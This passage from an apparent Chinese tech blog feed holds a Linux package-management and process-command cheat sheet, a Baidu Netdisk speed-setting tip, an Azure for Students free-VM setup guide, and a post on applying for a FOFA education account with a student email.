85);">dpkg只能安装已经下载到本地机器上的deb包. apt-get能在线下载并安装deb包,能更新系统,且还能自动处理包与包之间的依赖问题,这个是dpkg工具所不具备的；</font></li><li><font style="color:rgb(85, 85, 85);">rpm 只能安装已经下载到本地机器上的rpm 包. yum能在线下载并安装rpm包,能更新系统,且还能自动处理包与包之间的依赖问题,这个是rpm 工具所不具备的;</font></li><li><font style="color:rgb(85, 85, 85);">yum、rpm安装文件分布在&#x2F;usr的bin、lib、share不同目录，不用配置PATH，直接用命令，但可用命令卸载更新；</font></li><li><font style="color:rgb(85, 85, 85);">手动编译软件，默认位置为&#x2F;usr&#x2F;local下不同子目录下,不用配置PATH直接用命令（手动指定安装路径需要加PATH），使得软件更新和删除变得很麻烦。编译安装的软件没有卸载命令，卸载就是把所有这个软件的文件删除。</font></li></ul><h3 id="二进制-Binaries-包"><a href="#二进制-Binaries-包" class="headerlink" title="二进制(Binaries)包"></a><font style="color:rgb(51, 51, 51);">二进制(Binaries)包</font></h3><h4 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a><font style="color:rgb(51, 51, 51);">yum安装</font></h4><p><font style="color:rgb(119, 119, 119);">在线下载并安装rpm包，适用于CentOS、Fedora、RedHat及类似系统</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">yum install epel-releas</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装第三方yum源EPEL（企业版 Linux 附加软件包的简称）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum repolist enabled</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示可用的源仓库（&#x2F;etc&#x2F;yum.repos.d&#x2F;目录下配置）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum install yum-fastestmirror</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：自动选择最快的yum源</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum list installed |grep java</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：列出已安装的软件（查看已安装的JDK）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum remove java-1.8.0-openjdk.x86_64</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：卸载软件（卸载JDK）</font></li><li><font style="color:rgb(51, 51, 51);"><em></font><em><font style="color:rgb(51, 51, 51);">yum list java</font></em><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);"></em>* ：列出已安装和可安装的软件（查看yum库中的JDK包）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum install [-y] java-1.8.0-openjdk</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装软件JDK(-y自动安装)（推荐这种方式安装）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum install docker-ce-18.03.1.ce</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装指定版本的软件（已知docker-ce.x86_64 18.03.1.ce-1.el7.centos，则rpm包名为docker-ce-18.03.1.ce-1.el7.centos.x86_64.rpm）</font></li><li><font style="color:rgb(51, 51, 51);">**yum check-update [kernel] ** ：列出所有可更新的软件（检查更新kernel）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum update tomcat</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：更新软件（可所有）</font></li><li><strong><font style="color:rgb(51, 51, 51);">rpm -ql 软件名称</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查询yum安装路径（软件名称可通过rpm -qa|grep java）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum info kernel</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看软件（kernel）的信息</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum clean all</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：（清除缓存，使最新的yum配置生效）</font></li></ul><h5 id="yum安装常用工具"><a href="#yum安装常用工具" class="headerlink" title="yum安装常用工具"></a><font style="color:rgb(51, 51, 51);">yum安装常用工具</font></h5><ul><li><strong><font style="color:rgb(51, 51, 51);">yum install -y unzip zip</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装压缩、解压缩命令（zip、unzip）</font></li></ul><h4 id="rpm包手动下载安装"><a href="#rpm包手动下载安装" class="headerlink" title="rpm包手动下载安装"></a><font style="color:rgb(51, 51, 51);">rpm包手动下载安装</font></h4><p><font style="color:rgb(119, 119, 119);">yum中没有时用，适用于CentOS、Fedora、RedHat及类似系统；</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">wget -P &#x2F;opt</font>****<font style="color:rgb(51, 51, 51);"> </font></strong><a href="https://sourceforge.net/projects/nmon/files/nmon16e_mpginc.tar.gz"><strong><font style="color:rgb(51, 51, 51);">https:&#x2F;&#x2F;</font></strong></a><strong><font style="color:rgb(51, 51, 51);">网址</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：下载到&#x2F;opt目录</font></li><li><strong><font style="color:rgb(51, 51, 51);">rpm -ivh wps-office-版本.x86_64.rpm</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:安装rpm包（包要先下载）（要先装依赖包）</font></li><li><strong><font style="color:rgb(51, 51, 51);">rpm -e wps-office</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：卸载软件（注意不要软件名不要版本号）</font></li><li><strong><font style="color:rgb(51, 51, 51);">rpm -qa |grep wps</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看安装的rpm包（可用于查询rpm包是否被安装）</font></li><li><strong><font style="color:rgb(51, 51, 51);">rpm -ql 软件名称</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看rpm包安装路径（软件名称可通过rpm -qa|grep java）</font></li></ul><h4 id="apt方式安装"><a href="#apt方式安装" class="headerlink" title="apt方式安装"></a><font style="color:rgb(51, 51, 51);">apt方式安装</font></h4><p><font style="color:rgb(119, 119, 119);">安装deb包，类似yum安装，适用于Debian, Ubuntu 以及类似系统；</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">apt-get install aptitude</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装aptitude工具,实现依赖自动安装，依赖版本自动降级或升级</font></li><li><strong><font style="color:rgb(51, 51, 51);">aptitude install 软件</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装软件（推荐这种方式安装）</font></li><li><strong><font style="color:rgb(51, 51, 51);">apt-cache search 软件</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：搜索软件</font></li><li><strong><font style="color:rgb(51, 51, 51);">apt-get install 软件</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装软件</font></li><li><strong><font style="color:rgb(51, 51, 51);">apt-get purge 软件</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：卸载软件（包括配置文件，只删除软件purge换成remove）</font></li><li><strong><font style="color:rgb(51, 51, 51);">apt-get upgrade</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：更新所有已安装的软件包</font></li><li><strong><font style="color:rgb(51, 51, 51);">apt-get update</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：升级列表中的软件包</font></li><li><strong><font style="color:rgb(51, 51, 51);">apt-get clean</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：从下载的软件包中清理缓存</font></li></ul><h4 id="deb包安装"><a href="#deb包安装" class="headerlink" title="deb包安装"></a><font style="color:rgb(51, 51, 51);">deb包安装</font></h4><p><font style="color:rgb(119, 119, 119);">适用于Debian, Ubuntu 以及类似系统；</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">dpkg -i package.deb</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装一个 deb 包</font></li><li><strong><font style="color:rgb(51, 51, 51);">dpkg -r package_name</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：从系统删除一个 deb 包</font></li><li><strong><font style="color:rgb(51, 51, 51);">dpkg -l |grep chrome</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查询系统中所有已经安装的 deb 包</font></li><li><strong><font style="color:rgb(51, 51, 51);">dpkg -L 软件名称</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查软件安装的文件</font></li></ul><h4 id="解压即用"><a href="#解压即用" class="headerlink" title="解压即用"></a><font style="color:rgb(51, 51, 51);">解压即用</font></h4><p><font style="color:rgb(119, 119, 119);">大多数非开源的商业软件都采取这种办法；</font></p><p><font style="color:rgb(51, 51, 51);">二进制（Binaries）包如</font><a href="https://archive.apache.org/dist/jmeter/binaries/apache-jmeter-3.3.tgz"><font style="color:rgb(51, 51, 51);">apache-jmeter-3.3.tgz</font></a><font style="color:rgb(51, 51, 51);">，下载复制解压到&#x2F;opt，然后然后将该软件的 bin 目录加入到 PATH 中即可（vim &#x2F;etc&#x2F;profile export PATH&#x3D;$PATH:&#x2F;opt&#x2F;apache-jmeter-3.3&#x2F;bin）；</font></p><h4 id="软件自己的模块-包管理器"><a href="#软件自己的模块-包管理器" class="headerlink" title="软件自己的模块&#x2F;包管理器"></a><font style="color:rgb(51, 51, 51);">软件自己的模块&#x2F;包管理器</font></h4><p><font style="color:rgb(119, 119, 119);">如python：系统的源中不可能包含该软件的所有模块； 系统的源中该软件的模块的更新要远远滞后于最新版本；手动安装python，并用Python 自带的 pip 安装模块（类似yum）；</font></p><ul><li><font style="color:rgb(51, 51, 51);"><strong>pip install</font><font style="color:rgb(51, 51, 51);"> </font><a href="http://www.ttlsa.com/redis/"><font style="color:rgb(51, 51, 51);">redis</font></a><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);"></strong> ：安装python软件包</font><a href="http://www.ttlsa.com/redis/"><font style="color:rgb(51, 51, 51);">redis</font></a></li><li><font style="color:rgb(51, 51, 51);"><strong>pip unstall</font><font style="color:rgb(51, 51, 51);"> </font><a href="http://www.ttlsa.com/redis/"><font style="color:rgb(51, 51, 51);">redis</font></a><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);"></strong> :卸载</font></li><li><font style="color:rgb(51, 51, 51);"><strong>pip show –files</font><font style="color:rgb(51, 51, 51);"> </font><a href="http://www.ttlsa.com/redis/"><font style="color:rgb(51, 51, 51);">redis</font></a><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);"></strong> :pip查看已安装的包</font></li><li><strong><font style="color:rgb(51, 51, 51);">pip list –outdated</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:检查更新</font></li></ul><h3 id="源代码-Source-包"><a href="#源代码-Source-包" class="headerlink" title="源代码(Source)包"></a><font style="color:rgb(51, 51, 51);">源代码(Source)包</font></h3><h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a><font style="color:rgb(51, 51, 51);">编译安装</font></h4><p><font style="color:rgb(119, 119, 119);">源代码包（一般有install文件）如</font><a href="http://ftp.gnu.org/gnu/hello/hello-2.2.tar.bz2"><font style="color:rgb(119, 119, 119);">hello-2.2.tar.bz2</font></a><font style="color:rgb(119, 119, 119);">，下载复制到&#x2F;opt;</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">tar -jxvf hello-2.2.tar.bz2</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:解压</font></li><li><strong><font style="color:rgb(51, 51, 51);">.&#x2F;configure –prefix&#x3D;&#x2F;opt&#x2F;软件目录名称</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:为编译做好准备，加上 prefix 手动指定安装路径</font></li><li><strong><font style="color:rgb(51, 51, 51);">make</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：编译</font></li><li><strong><font style="color:rgb(51, 51, 51);">make install</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：安装</font></li><li><strong><font style="color:rgb(51, 51, 51);">make clean</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：删除安装时产生的临时文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">vim &#x2F;etc&#x2F;profile export PATH&#x3D;$PATH:&#x2F;opt&#x2F;目录&#x2F;bin</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：手动指定安装路径需要加path</font></li><li><strong><font style="color:rgb(51, 51, 51);">hello</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：执行软件：看INSTALL和README文件（是否源码包、如何安装、执行都看这两个）</font></li><li><strong><font style="color:rgb(51, 51, 51);">rm -rf 软件目录名称</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:卸载软件</font></li></ul><h2 id="服务与进程"><a href="#服务与进程" class="headerlink" title="服务与进程"></a><font style="color:rgb(51, 51, 51);">服务与进程</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">netstat -ntlp</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:查看服务器所有被占用端口</font></li><li><strong><font style="color:rgb(51, 51, 51);">netstat -lnp|grep 端口号&#x2F;进程号&#x2F;进程名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:根据查端口是否打开确认服务是否启动，配合ps命令可查服务占用的端口<br></font><font style="color:rgb(51, 51, 51);">常用参数：<br></font><font style="color:rgb(51, 51, 51);">-p：获取进程名、进程号；<br></font><font style="color:rgb(51, 51, 51);">-n：禁用域名解析功能，查出IP且速度快；<br></font><font style="color:rgb(51, 51, 51);">-l：只列出监听中的连接；<br></font><font style="color:rgb(51, 51, 51);">-t：只列出 TCP协议的连接。<br></font><font style="color:rgb(51, 51, 51);">示例：ps aux|grep tomcat netstat -lnp|grep 进程号 ：查tomcat服务占用的端口；</font></li><li><strong><font style="color:rgb(51, 51, 51);">ps aux|grep 进程号&#x2F;进程启动命令&#x2F;服务名</font></strong><font style="color:rgb(51, 51, 51);"> :进程查看命令ps(可查进程状态；进程占用cpu、内存；配合netstat根据某服务端口查出进程号用于杀进程，查服务启动命令及服务路径 ）</font></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>百度网盘提速方法</title>
      <link href="/2024/12/15/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%8F%90%E9%80%9F%E6%96%B9%E6%B3%95/"/>
      <url>/2024/12/15/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%8F%90%E9%80%9F%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>大家在每次购买网盘资料的时候肯定会遇到一个问题，就是自己没有足够的大米来购买网盘的SVIP，导致我们的下载速度非常的慢，就比如下图，每秒只能100kb，甚至几十kb，下载一个几百兆的视频要花费一个小时多，实在是令人等不起，这边爱笑就来教你花一分钟<strong>提高百度网盘的速度</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213235815921.png" alt="image-20241213235815688"></p><p><strong>1、首先我们要先打开我们右上角的三个点</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215165531993.png" alt="image-20241215165531716"><strong>2、打开之后点击我们的设置功能</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213235820476.png" alt="image-20241213235820086"></p><p><strong>3、接着点击传输功能</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213235825166.png" alt="image-20241213235825061"><strong>4、接着打开我们的优化速率，去开启该功能</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213235828480.png" alt="image-20241213235828364"><strong>5、打开优化速率功能</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213235831687.png" alt="image-20241213235831587"><strong>把所有设置都完成后，这样子我们的网盘就可以成功提速了</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213235835211.png" alt="image-20241213235835056">可以看到我们现在的下载速度是3.8M每秒了，宽带速度越快，下载速度就越快。</p>]]></content>
      
      
      <categories>
          
          <category> 白嫖指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【转载】关于微软Azure学生白嫖指南</title>
      <link href="/2024/12/15/%E5%85%B3%E4%BA%8E%E5%BE%AE%E8%BD%AFAzure%E5%AD%A6%E7%94%9F%E7%99%BD%E5%AB%96%E6%8C%87%E5%8D%97/"/>
      <url>/2024/12/15/%E5%85%B3%E4%BA%8E%E5%BE%AE%E8%BD%AFAzure%E5%AD%A6%E7%94%9F%E7%99%BD%E5%AB%96%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="申请Azure-for-students"><a href="#申请Azure-for-students" class="headerlink" title="申请Azure for students"></a>申请Azure for students</h1><p><font style="color:rgb(96, 98, 102);">申请地址：</font><a href="https://azure.microsoft.com/zh-cn/free/students/"><font style="color:rgb(96, 98, 102);">面向学生的Azure</font></a></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170058565.png" alt="image-20241214170051306"></p><p><font style="color:rgb(96, 98, 102);">点击免费开始使用，登录微软账号，然后会让你验证学生邮箱，按流程走下来就可以顺利申请到，我的学生邮箱是可以顺利申请到的，不过有听说部分邮箱会申请失败。里面的地区如实填写就好。</font></p><h1 id="查看Azure订阅信息"><a href="#查看Azure订阅信息" class="headerlink" title="查看Azure订阅信息"></a>查看Azure订阅信息</h1><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170102677.png"></p><p><font style="color:rgb(96, 98, 102);">点击订阅，如果申请成功会有Azure for students的订阅信息<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170107927.png" alt="image-20241214170107800"></p><p><font style="color:rgb(96, 98, 102);">另外你可以在</font><a href="https://www.microsoftazuresponsorships.com/"><font style="color:rgb(96, 98, 102);">余额查看</font></a><font style="color:rgb(96, 98, 102);">里查看自己100刀的余额<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170111083.png" alt="image-20241214170110965"></p><h1 id="创建Linux虚拟机"><a href="#创建Linux虚拟机" class="headerlink" title="创建Linux虚拟机"></a>创建Linux虚拟机</h1><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170113757.png" alt="image-20241214170113651"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">首页点击虚拟机，然后创建虚拟机，来到如下界面<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170117230.png" alt="image-20241214170117041"></p><p><font style="color:rgb(96, 98, 102);">首先需要新建一个资源组，然后选择一个区域，East Asia实际就是香港，东南亚是新加坡，但是新加坡好像没有vps可以创建了，据网上博客说香港实际延迟最低，其次新加坡日本啥的。然后在大小里面选择B1S（据网上看到的一些博客说微软学生包实际包含两台免费的B1S，所以B1S是不会扣额度的，而更便宜的B1ls会扣额度，但我没在官网看到，所以这点存疑待验证，但是B1S任然是比较好的选择，），连接可以自己选择密钥连接或者账户密码连接，然后选择入站端口，这里默认就好。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170124550.png" alt="image-20241214170124442"></p><p><font style="color:rgb(96, 98, 102);">以下不要管，也不要创建或添加现有磁盘，创建虚拟机会默认给你分配磁盘。<br></font><font style="color:rgb(96, 98, 102);">剩下的一路默认下去，然后最后一步创建就行了。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170128016.png" alt="image-20241214170127871"></p><p><font style="color:rgb(96, 98, 102);">微软学生包会有两个免费的64G SSD，但是前面我们创建虚拟机分配的磁盘并不是64G的，所以我们需要更改使用免费磁盘。</font></p><p><font style="color:rgb(96, 98, 102);">来到我们创建的虚拟机控制台。点击停止，然后可能会弹出保存公共IP的信息，这里保存的话就是静态IP，这个服务是收费的，不保存的话每次停机启动就会重新变IP，不过在shell里面通过reboot这个命令重启是不会变的，只有在主页里面停机启动才会变，所以一般没必要开。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170131954.png" alt="image-20241214170131855"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">停用之后点击左侧磁盘，并进入磁盘管理<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170134672.png" alt="image-20241214170134547"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">在大小和性能中，大小选择64，性能选择P6，磁盘为高级SSD，默认就为高级，所以不去改就行。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170137887.png" alt="image-20241214170137700"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">更改完配置后再重新启动就行</font></p><h1 id="创建Windows虚拟机"><a href="#创建Windows虚拟机" class="headerlink" title="创建Windows虚拟机"></a>创建Windows虚拟机</h1><p><font style="color:rgb(96, 98, 102);">linux主机默认情况下系统盘是30G，windows是120G，我们要做的就是把这个系统盘改成免费的64G的。</font></p><p><font style="color:rgb(96, 98, 102);">对于linux主机，可以直接创建，然后停止后修改磁盘大小。</font></p><p><font style="color:rgb(96, 98, 102);">对于windows，因为磁盘只能向上扩，不能缩小，所以windows的只能选择smalldisk系列的镜像，创建好后停止后修改磁盘大小。</font></p><p><font style="color:rgb(96, 98, 102);">正常创建虚拟机，size选b1s，镜像选择上windows的搜索smalldisk，对于b1s实例建议选择windows server 2012 r2的。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170141518.png" alt="image-20241214170141363"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">azure上对于windows实例是要加收钱的，但他有一个选项，就是可以使用你现有的windows许可抵消，使用的方法也很简单，只要勾选一个选项就可以了。所以我们创建windows主机的时候为了省钱一般都会勾选这个选项。问题就在这里，为了能够使用到免费的b1s的windows实例，你创建虚拟机的时候不要去选这个，这样创建出来的windows虚拟机就会计算到B1s – BS Series Windows上。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170144915.png" alt="image-20241214170144830"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">创建好虚拟机后，点虚拟机进去，顶部有几个操作按钮，点击停止。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170147107.png" alt="image-20241214170147013"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">停止后，点击左边菜单的disks，进入磁盘页面，点击os disk下面的那个磁盘连接。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170149594.png" alt="image-20241214170149488"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">进入后，点击configuration，将大小改为64，点击保存。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170153309.png" alt="image-20241214170153192"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">完成后回到虚拟机页面，点击start，启动虚拟机即可完成系统盘改为免费64G磁盘的目的。<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170155689.png" alt="image-20241214170155594"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">至此，你就可以充分使用azure学生订阅提供的免费配额，一个linux跑点服务，一个windows挂机，很方便，以香港区的价格计算，光这两个完全免费的虚拟机每年的价值就两三百刀。</font></p><h1 id="修改Azure的IP"><a href="#修改Azure的IP" class="headerlink" title="修改Azure的IP"></a>修改Azure的IP</h1><h2 id="1、解绑原IP"><a href="#1、解绑原IP" class="headerlink" title="1、解绑原IP"></a>1、解绑原IP</h2><p><font style="color:rgb(96, 98, 102);">进入服务器所在的【资源组】，点击原IP地址，即可跳转至概述页面，如下图：<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170257189.png"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">点击【取消关联】，按提示操作即可(上图IP已取消，不能再次点击)。</font></p><h2 id="2、创建新的IP"><a href="#2、创建新的IP" class="headerlink" title="2、创建新的IP"></a>2、创建新的IP</h2><p><font style="color:rgb(96, 98, 102);">在任意页面的上方搜索【公共IP地址】，进入下图页面：<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170306802.png" alt="image-20241214170306561"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">点击【创建公共IP地址】，按页面提示操作即可，如下所示：<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170310198.png" alt="image-20241214170310073"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">等待数秒，即可看到新IP已就绪：<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170316011.png" alt="image-20241214170315908"></p><h2 id="3、绑定新IP"><a href="#3、绑定新IP" class="headerlink" title="3、绑定新IP"></a>3、绑定新IP</h2><p><font style="color:rgb(96, 98, 102);">从资源组点击新IP地址，进入概述页面，如下：<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170323026.png" alt="image-20241214170322877"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">点击【关联】，在资源类型的地方选择【网络接口】，如下：<br></font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241214170326059.png" alt="image-20241214170325855"><font style="color:rgb(96, 98, 102);"><br></font><font style="color:rgb(96, 98, 102);">新IP就切换完成啦</font></p>]]></content>
      
      
      <categories>
          
          <category> 白嫖指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于FOFA空间搜索引擎会员学生白嫖指南</title>
      <link href="/2024/12/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%99%BD%E5%AB%96FOFA%E4%BC%9A%E5%91%98/"/>
      <url>/2024/12/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%99%BD%E5%AB%96FOFA%E4%BC%9A%E5%91%98/</url>
      
        <content type="html"><![CDATA[<p>很多网络安全的糕手们都会去打攻防演练，而其中一个最重要的步骤就是资产收集，只有收集足够多的资产才能够更好的挖到偏远资产的漏洞，才能获得更高的分数，这边我教大家如何去白嫖目前比较火的FOFA空间搜索引擎的会员，我把链接放在文章末了，大家有需要的可以自取<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231638638.png" alt="image-20241213231638370"></p><p><strong>只要点击这个邮箱，然后用你的学生邮箱注册，就可以获得永久FOFA会员啦~~~</strong></p><p><strong>面向免费个人教育账号放生和教师开学</strong></p><p>FOFA（网络空间资产搜索引擎）是世界上数据覆盖更完整的IT设备搜索引擎，拥有全球联网IT设备更全的DNA信息。</p><p>探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等。FOFA请使用edu邮箱注册登录</p><p><strong>谁可以获得FOFA教育账号</strong></p><p>欢迎来自正规教育机构（国家认可的高等院校）的学生和教职员工申请</p><p>学生必须是参加正规高校全日制学习计划，需要三年或多年学习才能完成计划</p><p>需要您使用edu.cn或ucas.ac.cn邮箱注册申请，验证您的教育身份</p><p><strong>FOFA教育账号开通须知</strong></p><p>开通邮箱必须为edu.cn或ucas.ac.cn邮箱，您提交申请后我们将在五个工作日内为您审核并开通</p><p>我们为您开通三个月的教育账号有效期后，您的邮箱将收到会员组变更通知</p><p>此后每三个月将自动发送一次验证邮件，只要您仍是学生或教师就可以继续续订</p><p>如有疑问可参阅底部常见问题解答。若仍未解决，请联系 FofaBot 协助解决。</p><p>请使用edu邮箱注册登录</p><h1 id="常见问题解答"><a href="#常见问题解答" class="headerlink" title="常见问题解答"></a>常见问题解答</h1><h2 id="我没有EDU邮箱怎么办？"><a href="#我没有EDU邮箱怎么办？" class="headerlink" title="我没有EDU邮箱怎么办？"></a>我没有EDU邮箱怎么办？</h2><p>一般情况下，大学生在入学后会默认发放EDU邮箱，您可以尝试咨询辅导老师或同学如何申请EDU邮箱，若仍未解决，请联系 FofaBot 协助解决。</p><h2 id="FOFA教育账号是永久的吗？"><a href="#FOFA教育账号是永久的吗？" class="headerlink" title="FOFA教育账号是永久的吗？"></a>FOFA教育账号是永久的吗？</h2><p>不是，FOFA教育账号仅面向学生和教职员工开放，不提供永久教育账号。</p><h2 id="我是学生，我可以在做实习工作的时候免费使用FOFA教育账号吗？"><a href="#我是学生，我可以在做实习工作的时候免费使用FOFA教育账号吗？" class="headerlink" title="我是学生，我可以在做实习工作的时候免费使用FOFA教育账号吗？"></a>我是学生，我可以在做实习工作的时候免费使用FOFA教育账号吗？</h2><p>不可以，FOFA教育账号必须严格用于非商业用途。如果您已在商业公司就职，可以考虑要求公司为您采购需要的FOFA会员账号。若您是自由职业者可以按照您的个人需求进行订阅。</p><h2 